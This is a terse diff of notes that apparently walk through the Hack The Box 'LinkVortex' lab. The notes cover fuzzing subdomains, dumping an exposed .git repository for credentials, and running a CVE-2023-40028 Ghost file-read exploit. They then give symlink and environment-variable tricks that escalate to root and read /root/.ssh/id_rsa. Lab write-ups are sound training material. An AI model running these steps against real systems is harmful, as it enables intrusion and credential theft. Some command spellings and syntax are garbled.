@@ -1,0 +1,30 @@
+-- Until get the shell
+nmap & edit /etc/hosts(<ip> linkvortex.htb)
+visit http://linkvortex.htb -> using ghost -> http://linkvortex.htb/ghost: redirect to login page, admin user can be found in the posts
+
+fuff to fuzz subdomains: fuff -u http://linkvortex.htb -H 'Host: FUZZ.linkvortex.htb' -w raft-small-directories-lowercase.txt: Find new subdomain dev
+fuff to fuzz directories: fuff -u http://dev.linkvortex.htb/FUZZ -w raft-small-files-lowercase.txt: Find .git file
+
+http://dev.linkvortex.htb/.git: .git repository
+pipx install git-dumper; git-dumper http://dev.linkvortex.htb/.git
+git diff --cached: Shows password -> can login to linkvortex.htb/ghost
+less Dockerfile.ghost: Config file in /var/lib/ghost/config.production.json
+
+CVE-2023-40028: .png file link to actual file path, zip, and upload the file -> curl to linkvortex.htb/<.png file path> shows the file content of the server
+git clone https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028.git: Automatic tool for exploit
+./CVE-2023-40028 -u admin@linkvortex.htb -p <pass> -h http://linkvortex.htb: Look for /var/lib/ghost/config.production.json -> Find password for bob
+
+ssh bob@linkvortex.htb
+
+-- Privilege Escalation
+sudo -l: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
+3 ways to exploit
+1. ln -sf /anywhere a.png
+  $CHECK_CONTENT=bash sudo /usr/bin/bash /opt/ghost/clean_symlink.sh a.png: drop to root($CHECK_CONTENT not quoted)
+2. ln -sf /home/bob/a2.png a1.png
+  ln -sf /root/.ssh/id_rsa a2.png
+  $CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh a1.png: shows id_rsa file(Code cannot detect it's looking for /etc or /root files if it's linked more than once)
+3. ln -sf /anywhere a3.png
+On the other shell, cd to /var/quarantined: while true; do ln -sf /root/.ssh/id_rsa a3.png; done
+  $CHECK_CONTENT=true sudo /usr/bin/bash /opt/ghost/clean_symlink.sh a3.png: shows id_rsa file
+  (Infinite loop rewrites /var/quarantined/a3.png while running the code. Very timely and need to try several times to succeed)
